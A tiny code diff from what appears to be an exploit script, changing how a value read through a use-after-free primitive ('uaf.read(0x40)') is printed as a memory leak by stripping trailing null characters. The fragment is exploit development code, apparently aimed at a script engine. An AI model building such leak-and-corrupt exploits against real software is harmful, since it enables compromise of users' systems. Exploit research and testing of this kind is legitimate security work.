@@ -9,4 +9,4 @@ if (!info.reused) {
 }
 
 let leak = uaf.read(0x40);
-print('[*] leak = ' + leak);
+print('[*] leak = ' + leak.replace(/\u0000+$/, ''));
